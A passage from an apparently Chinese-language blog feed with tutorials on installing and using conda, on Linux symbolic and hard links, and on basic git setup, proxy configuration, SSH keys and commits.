环境变量，或者想手动添加，可以按照以下步骤进行：</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ol><li><p><strong>打开环境变量设置：</strong></p><ul><li>右键点击“此电脑”或“我的电脑”，选择“属性”。</li><li>点击“高级系统设置”。</li><li>在“系统属性”窗口中，点击“环境变量”。</li></ul></li><li><p><strong>编辑 <code>PATH</code> 变量：</strong></p><ul><li><p>在“系统变量”或“用户变量”部分，找到并选中 <code>Path</code> 变量，点击“编辑”。</p></li><li><p>点击“新建”，添加 Anaconda 或 Miniconda 的安装路径。例如：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">C</span><span class="token punctuation">:</span>\Users\YourUsername\Anaconda3<span class="token target symbol">C</span><span class="token punctuation">:</span>\Users\YourUsername\Anaconda3\Scripts<span class="token target symbol">C</span><span class="token punctuation">:</span>\Users\YourUsername\Anaconda3\Library\bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>保存并退出设置。</p></li></ul></li><li><p><strong>验证配置：</strong></p><ul><li><p>打开命令提示符，运行 conda验证是否可用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><h4 id="macOS-和-Linux"><a href="#macOS-和-Linux" class="headerlink" title="macOS 和 Linux"></a>macOS 和 Linux</h4><ol><li><p><strong>编辑 Shell 配置文件：</strong></p><ul><li><p>打开终端，编辑你的 shell 配置文件（如 <code>.bashrc</code>, <code>.zshrc</code>, <code>.bash_profile</code> 等）。</p></li><li><p>添加以下行到文件末尾：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$HOME</span>/miniconda3/bin:<span class="token environment constant">$PATH</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装的是 Anaconda，将路径替换为 Anaconda 的安装路径。</p></li></ul></li><li><p><strong>刷新配置文件：</strong></p><ul><li><p>保存文件后，运行以下命令使更改生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.bashrc  <span class="token comment"># 或者 `source ~/.zshrc`，具体取决于你使用的 shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p><strong>验证配置：</strong></p><ul><li><p>在终端运行 conda 验证是否可用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol></li><li><p><strong>初始化 conda</strong></p><ul><li><p>安装完成后，运行以下命令初始化 conda：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>重新启动终端，以确保初始化生效。</p></li></ul></li></ol><h3 id="Conda-的使用"><a href="#Conda-的使用" class="headerlink" title="Conda 的使用"></a>Conda 的使用</h3><h4 id="1-验证安装"><a href="#1-验证安装" class="headerlink" title="1. 验证安装"></a>1. 验证安装</h4><p>在终端或命令提示符中运行以下命令，查看 conda 是否安装成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你应该看到类似 <code>conda 4.x.x</code> 的输出，表明 conda 已成功安装。</p><h4 id="2-更新-Conda"><a href="#2-更新-Conda" class="headerlink" title="2. 更新 Conda"></a>2. 更新 Conda</h4><p>安装后，建议将 conda 更新到最新版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda update conda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-创建新环境"><a href="#3-创建新环境" class="headerlink" title="3. 创建新环境"></a>3. 创建新环境</h4><p>使用以下命令创建一个新的 Python 环境（例如 <code>myenv</code>），并指定 Python 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> myenv <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将创建一个名为 <code>myenv</code> 的新环境并安装 Python 3.9。</p><h4 id="4-激活环境"><a href="#4-激活环境" class="headerlink" title="4. 激活环境"></a>4. 激活环境</h4><p>创建环境后，使用以下命令激活它：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda activate myenvconda deactivate myenv <span class="token comment"># 关闭环境</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>激活环境后，命令提示符前缀将会显示当前激活的环境名称。</p><h4 id="5-安装包"><a href="#5-安装包" class="headerlink" title="5. 安装包"></a>5. 安装包</h4><p>在激活的环境中，使用以下命令安装所需包（例如 NumPy）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">install</span> numpy <span class="token comment"># 这里安装的包只有使用conda list能看到,pip list 不能查看，但是在某个具体环境安装的都是conda 和 pip 的包共同工作的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Conda 会自动处理包的依赖关系，并为你安装所有必要的依赖。</p><h4 id="6-列出已安装的包"><a href="#6-列出已安装的包" class="headerlink" title="6. 列出已安装的包"></a>6. 列出已安装的包</h4><p>使用以下命令查看当前环境中已安装的所有包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-更新包"><a href="#7-更新包" class="headerlink" title="7. 更新包"></a>7. 更新包</h4><p>使用以下命令更新特定包（例如 NumPy）到最新版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda update numpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-删除包"><a href="#8-删除包" class="headerlink" title="8. 删除包"></a>8. 删除包</h4><p>若不再需要某个包，可以使用以下命令将其删除：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda remove numpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-列出所有环境"><a href="#9-列出所有环境" class="headerlink" title="9. 列出所有环境"></a>9. 列出所有环境</h4><p>使用以下命令查看你创建的所有环境：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">env</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-删除环境"><a href="#10-删除环境" class="headerlink" title="10. 删除环境"></a>10. 删除环境</h4><p>若不再需要某个环境，可以使用以下命令删除它：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda remove <span class="token parameter variable">-n</span> myenv <span class="token parameter variable">--all</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="11-添加pycharm可执行文件"><a href="#11-添加pycharm可执行文件" class="headerlink" title="11.添加pycharm可执行文件"></a>11.添加pycharm可执行文件</h4><p>在设置/首选项窗口中，选择左侧的 <code>Project: 你的项目名</code> &gt; <code>Python Interpreter（解释器）</code>，在Python Interpreter页面，点击右侧的添加解释器，选择 添加本地解释器，在弹出的窗口中，选择 <code>Conda Environment</code>，可执行文件若为空，复制<code>conda\condabin\conda.bat</code>文件的目录到框里就，在加载</p><h4 id="12-查找包"><a href="#12-查找包" class="headerlink" title="12.查找包"></a>12.查找包</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda search numpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="13-生成需要分享环境的yml文件-需要在虚拟环境中执行"><a href="#13-生成需要分享环境的yml文件-需要在虚拟环境中执行" class="headerlink" title="13.生成需要分享环境的yml文件 (需要在虚拟环境中执行)"></a>13.生成需要分享环境的yml文件 (需要在虚拟环境中执行)</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">env</span> <span class="token builtin class-name">export</span> <span class="token operator">&gt;</span> environment.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="14-指定配置创建"><a href="#14-指定配置创建" class="headerlink" title="14.指定配置创建"></a>14.指定配置创建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda <span class="token function">env</span> create <span class="token parameter variable">-f</span> environment.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>安装卸载conda时关闭火绒</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软链接和硬链接</title>
      <link href="/2024/08/10/ruan-lian-jie-he-ying-lian-jie/"/>
      <url>/2024/08/10/ruan-lian-jie-he-ying-lian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="软链接和硬链接"><a href="#软链接和硬链接" class="headerlink" title="软链接和硬链接"></a>软链接和硬链接</h1><p>在Linux和Unix系统中，<strong>软链接</strong>（符号链接，symbolic link，简称<code>symlink</code>）和<strong>硬链接</strong>（hard link）是两种用于指向文件或目录的方式。它们有不同的用途和行为。</p><h2 id="1-软链接（Symbolic-Link）"><a href="#1-软链接（Symbolic-Link）" class="headerlink" title="1. 软链接（Symbolic Link）"></a>1. 软链接（Symbolic Link）</h2><p>软链接类似于Windows中的快捷方式，它是一个指向另一个文件或目录的指针。创建软链接后，这个链接文件本身并不包含目标文件的数据，而是包含目标文件的路径。</p><h4 id="特性："><a href="#特性：" class="headerlink" title="特性："></a>特性：</h4><ul><li><strong>指向目标文件的路径</strong>：软链接文件仅存储目标文件的路径，而不是文件内容。</li><li><strong>跨文件系统</strong>：软链接可以指向不同文件系统中的文件或目录。</li><li><strong>链断裂问题</strong>：如果目标文件被删除或移动，软链接将失效，成为“断链”。</li><li><strong>文件大小</strong>：软链接的大小是指向目标文件路径的长度。</li></ul><h4 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h4><p>要创建一个软链接，你可以使用<code>ln -s</code>命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /path/to/target /path/to/symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/user/original_file.txt /home/user/shortcut_to_file.txt <span class="token comment"># 也可以是目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将创建一个名为<code>shortcut_to_file.txt</code>的软链接，指向<code>/home/user/original_file.txt</code>。</p><h4 id="查看软链接"><a href="#查看软链接" class="headerlink" title="查看软链接"></a>查看软链接</h4><p>使用<code>ls -l</code>命令可以查看软链接的详细信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /path/to/symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/user/shortcut_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lrwxrwxrwx <span class="token number">1</span> user user <span class="token number">21</span> Aug <span class="token number">12</span> <span class="token number">12</span>:00 /home/user/shortcut_to_file.txt -<span class="token operator">&gt;</span> /home/user/original_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>l</code>表示这是一个软链接，箭头<code>-&gt;</code>后面是目标路径。</p><h4 id="删除软链接"><a href="#删除软链接" class="headerlink" title="删除软链接"></a>删除软链接</h4><p>使用<code>rm</code>命令删除软链接。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /path/to/symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /home/user/shortcut_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将删除软链接，但不会影响目标文件。</p><h2 id="2-硬链接（Hard-Link）"><a href="#2-硬链接（Hard-Link）" class="headerlink" title="2. 硬链接（Hard Link）"></a>2. 硬链接（Hard Link）</h2><p>硬链接是文件系统中的一个目录条目，它指向文件的实际数据块。与软链接不同，硬链接不是指向路径，而是指向数据块。因此，硬链接和原始文件共享相同的数据块。</p><h4 id="特性：-1"><a href="#特性：-1" class="headerlink" title="特性："></a>特性：</h4><ul><li><strong>指向数据块</strong>：硬链接指向文件的实际数据块，而不是路径。</li><li><strong>共享文件数据</strong>：硬链接和原始文件共享相同的数据块，因此它们内容完全相同，且修改一个文件内容会同时更新硬链接的内容。</li><li><strong>不可跨文件系统</strong>：硬链接必须在同一文件系统内。</li><li><strong>删除影响</strong>：删除一个硬链接不会影响文件的实际数据，只有当所有指向数据块的硬链接都删除后，文件的数据才会被删除。</li></ul><h4 id="创建硬链接"><a href="#创建硬链接" class="headerlink" title="创建硬链接"></a>创建硬链接</h4><p>要创建一个硬链接，你可以使用<code>ln</code>命令（不带<code>-s</code>选项）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> /path/to/target /path/to/hardlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> /home/user/original_file.txt /home/user/hardlink_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将创建一个名为<code>hardlink_to_file.txt</code>的硬链接，指向<code>/home/user/original_file.txt</code>的数据块。</p><h4 id="查看硬链接"><a href="#查看硬链接" class="headerlink" title="查看硬链接"></a>查看硬链接</h4><p>使用<code>ls -li</code>命令可以查看文件的inode号，硬链接共享相同的inode号。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-li</span> /path/to/target /path/to/hardlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-li</span> /home/user/original_file.txt /home/user/hardlink_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1234567</span> -rw-r--r-- <span class="token number">2</span> user user <span class="token number">1024</span> Aug <span class="token number">12</span> <span class="token number">12</span>:00 /home/user/original_file.txt<span class="token number">1234567</span> -rw-r--r-- <span class="token number">2</span> user user <span class="token number">1024</span> Aug <span class="token number">12</span> <span class="token number">12</span>:00 /home/user/hardlink_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>两个文件共享相同的inode号（<code>1234567</code>），说明它们是硬链接。</p><h4 id="删除硬链接"><a href="#删除硬链接" class="headerlink" title="删除硬链接"></a>删除硬链接</h4><p>使用<code>rm</code>命令删除硬链接。删除硬链接不会删除文件数据，只有当所有硬链接都被删除后，文件数据才会被删除。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /path/to/hardlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /home/user/hardlink_to_file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将删除硬链接，但<code>/home/user/original_file.txt</code>仍然存在，文件数据依然可用。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><strong>软链接</strong>：适合用作快捷方式和指向目录。使用软链接时，请确保目标文件存在，或会造成“断链”。</li><li><strong>硬链接</strong>：适用于同一文件系统内共享文件数据，不能链接到目录（通常情况下）。硬链接不可跨文件系统。</li></ul><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><ul><li><p><strong>查看所有链接</strong>：使用<code>find</code>命令查找所有指向某个目标的软链接或硬链接。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /path/to/directory <span class="token parameter variable">-type</span> l <span class="token parameter variable">-name</span> <span class="token string">"link_name"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会查找所有名为<code>link_name</code>的软链接。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git使用</title>
      <link href="/2024/08/09/git-shi-yong/"/>
      <url>/2024/08/09/git-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="git使用"><a href="#git使用" class="headerlink" title="git使用"></a>git使用</h1><h3 id="1-安装-Git"><a href="#1-安装-Git" class="headerlink" title="1. 安装 Git"></a>1. 安装 Git</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ol><li>从 <a href="https://git-scm.com/download/win">Git 官方网站</a> 下载 Git 安装程序。</li><li>双击安装程序并按照提示完成安装。</li></ol><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ol><li><p>使用包管理器安装 Git（以 Ubuntu 为例）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="2-配置-Git"><a href="#2-配置-Git" class="headerlink" title="2. 配置 Git"></a>2. 配置 Git</h3><p>安装完成后，配置用户名和邮箱：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"你的名字"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"你的邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置 HTTP 和 HTTPS 代理</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy http://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy http://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token comment"># 如果是 SOCKS5 代理</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy socks5://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy socks5://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token comment"># 示例</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy http://127.0.0.1:1080<span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy socks5://127.0.0.1:1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>撤销代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 取消 HTTP 和 HTTPS 代理</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.proxy<span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> https.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>验证</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--get</span> http.proxy<span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--get</span> https.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在powershell终端设置一次代理就不会改变，其他未测试，可以修改配置文件，如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 临时设置（当前终端）</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span>http://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span>http://<span class="token operator">&lt;</span>代理地址<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>端口<span class="token operator">&gt;</span><span class="token comment"># 示例</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span>http://127.0.0.1:1080<span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span>http://127.0.0.1:1080<span class="token comment"># 永久设置（在 `.bashrc` 或 `.zshrc` 中添加）</span><span class="token builtin class-name">echo</span> <span class="token string">"export http_proxy=http://127.0.0.1:1080"</span> <span class="token operator">&gt;&gt;</span> ~/.bashrc<span class="token builtin class-name">echo</span> <span class="token string">"export https_proxy=http://127.0.0.1:1080"</span> <span class="token operator">&gt;&gt;</span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-创建-SSH-Key"><a href="#3-创建-SSH-Key" class="headerlink" title="3. 创建 SSH Key"></a>3. 创建 SSH Key</h3><p>如果需要使用 SSH 方式连接 GitHub，生成 SSH key 并添加到 GitHub。</p><h4 id="生成-SSH-Key"><a href="#生成-SSH-Key" class="headerlink" title="生成 SSH Key"></a>生成 SSH Key</h4><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa -C "你的邮箱"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按提示操作，默认保存位置即可。生成完成后，使用以下命令查看公钥：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="添加-SSH-Key-到-GitHub"><a href="#添加-SSH-Key-到-GitHub" class="headerlink" title="添加 SSH Key 到 GitHub"></a>添加 SSH Key 到 GitHub</h4><ol><li>登录 GitHub，进入 <a href="https://github.com/settings/keys">SSH and GPG keys</a> 页面。</li><li>点击 “New SSH key”，粘贴上一步生成的公钥内容，点击 “Add SSH key”。</li></ol><h3 id="4-创建-Git-仓库"><a href="#4-创建-Git-仓库" class="headerlink" title="4. 创建 Git 仓库"></a>4. 创建 Git 仓库</h3><h4 id="本地仓库"><a href="#本地仓库" class="headerlink" title="本地仓库"></a>本地仓库</h4><ol><li><p>创建一个新的目录并进入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> my_project<span class="token builtin class-name">cd</span> my_project<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>初始化 Git 仓库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><ol><li><p>登录 GitHub，点击右上角 “+”，选择 “New repository”。</p></li><li><p>填写仓库名和描述，点击 “Create repository”。</p></li><li><p><code>.gitignore</code> 文件用于告诉 Git 哪些文件或目录不应该被添加到版本控制中。它在 Git 项目中非常重要，特别是当你的项目包含一些不需要共享的文件，如编译后的二进制文件、临时文件、或包含敏感信息的配置文件。</p><p><code>.gitignore</code> 文件通常放在项目的根目录下，但你也可以在子目录中添加 <code>.gitignore</code> 文件，作用范围仅限于该目录及其子目录。</p><p><code>.gitignore</code> 文件的语法</p><ul><li><p><strong>忽略特定文件或目录</strong>：在 <code>.gitignore</code> 中直接写上文件名或目录名。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 忽略文件</span>secret.txt<span class="token comment"># 忽略目录</span>/logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>通配符</strong>：使用 <code>*</code> 代表任意字符，<code>?</code> 代表单个字符，<code>[abc]</code> 代表匹配集合中的任意一个字符。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 忽略所有 .log 文件</span>*.log<span class="token comment"># 忽略以 "temp" 开头的文件</span>temp*<span class="token comment"># 忽略名为 "backup" 或 "bak" 的文件</span>*.<span class="token punctuation">[</span>bB<span class="token punctuation">]</span><span class="token punctuation">[</span>aA<span class="token punctuation">]</span><span class="token punctuation">[</span>kK<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>排除规则</strong>：以 <code>!</code> 开头的行用于排除某些文件或目录，这些文件即使符合前面的忽略规则也不会被忽略。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 忽略所有 .log 文件，但不忽略 important.log</span>*.log<span class="token operator">!</span>important.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>指定路径</strong>：使用斜杠 <code>/</code> 来表示目录路径。以斜杠开头表示从根目录开始匹配。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 只忽略根目录下的 "config.json"，不忽略其他目录中的 "config.json"</span>/config.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ol><h3 id="5-关联本地仓库与远程仓库"><a href="#5-关联本地仓库与远程仓库" class="headerlink" title="5. 关联本地仓库与远程仓库"></a>5. 关联本地仓库与远程仓库</h3><p>在本地仓库中，执行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">add</span> origin git@github.com:你的用户名/仓库名.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>git remote add</code> 是一个 Git 命令，用于向你的本地仓库添加一个远程仓库。一个远程仓库是一个托管在某个服务器上的 Git 仓库，你可以将本地的更改推送到远程仓库，也可以从远程仓库拉取更新。</p><p><code>origin</code> 是这个远程仓库的名字。你可以把它理解为远程仓库的一个别名，便于你以后引用这个远程仓库。在大多数情况下，<code>origin</code> 是默认的名字，用于指向你克隆的或第一次关联的远程仓库。</p><p>通过执行这条命令，你告诉 Git：**这个本地仓库的远程仓库是位于 GitHub 上的 <code>git@github.com:你的用户名/仓库名.git</code> 这个位置，并且将它命名为 <code>origin</code>**。</p><p>之后，你可以使用类似 <code>git push origin master</code> 的命令将本地的代码推送到 GitHub 上的远程仓库，或者使用 <code>git pull origin master</code> 从 GitHub 上拉取更新。</p><h3 id="6-基本-Git-操作"><a href="#6-基本-Git-操作" class="headerlink" title="6. 基本 Git 操作"></a>6. 基本 Git 操作</h3><h4 id="添加文件并提交"><a href="#添加文件并提交" class="headerlink" title="添加文件并提交"></a>添加文件并提交</h4><p>提交前的工作目录是工作区（文件操作的区域）</p><p>添加文件到暂存区：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令用于将指定的文件添加到 Git 的暂存区（Stage）。暂存区是一个临时区域，你可以在其中暂时存放那些你准备提交到仓库的更改。文件在添加到暂存区之前，可以进行修改，而这些修改不会立即提交到仓库中。</p><p>或添加所有文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交到本地仓库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"提交信息"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令用于将暂存区中的所有内容提交到本地 Git 仓库，并为此次提交添加一条消息。<code>-m "提交信息"</code> 选项允许你在命令行中直接输入一条提交信息，而不需要进入编辑器。</p><h4 id="查看暂存区的文件"><a href="#查看暂存区的文件" class="headerlink" title="查看暂存区的文件"></a>查看暂存区的文件</h4><p><code>git status</code> 命令会显示工作区和暂存区的状态，包括哪些文件被修改但尚未添加到暂存区，以及哪些文件已经被添加到暂存区。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出中，暂存区中的文件会显示在 <code>Changes to be committed</code> 部分。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Changes to be committed:  <span 